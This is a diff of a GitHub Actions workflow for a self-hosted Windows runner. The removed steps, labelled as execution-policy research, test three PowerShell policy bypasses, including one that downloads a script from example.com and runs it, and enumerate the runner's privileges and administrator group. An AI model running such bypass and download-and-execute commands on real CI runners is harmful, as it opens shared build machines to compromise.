@@ -1,35 +1,9 @@
-name: execution-policy-research
+name: privilege-check
 on: workflow_dispatch
 jobs:
-  policy-test:
+  test:
     runs-on: [self-hosted, Windows, X64]
     steps:
-      # Test 1: Policy durumu
-      - name: Check Policy
+      - name: Check Privileges
         shell: cmd
-        run: powershell -Command "Get-ExecutionPolicy -List"
-      
-      # Test 2: Bypass methods
-      - name: Bypass Method 1 - Command
-        shell: cmd
-        run: powershell -ExecutionPolicy Bypass -Command "Write-Host 'Bypass successful!'"
-      
-      - name: Bypass Method 2 - EncodedCommand
-        shell: cmd
-        run: |
-          echo $text = 'whoami'; Invoke-Expression $text > encoded.ps1
-          powershell -ExecutionPolicy Bypass -File encoded.ps1
-      
-      - name: Bypass Method 3 - Download & Execute
-        shell: cmd
-        run: |
-          powershell -Command "Invoke-WebRequest -Uri 'https://example.com/script.ps1' -OutFile test.ps1"
-          powershell -ExecutionPolicy Bypass -File test.ps1
-      
-      # Test 4: Runner kullanıcısının yetkileri
-      - name: Check Runner Permissions
-        shell: cmd
-        run: |
-          whoami /priv
-          net user %USERNAME%
-          net localgroup administrators
+        run: whoami /priv
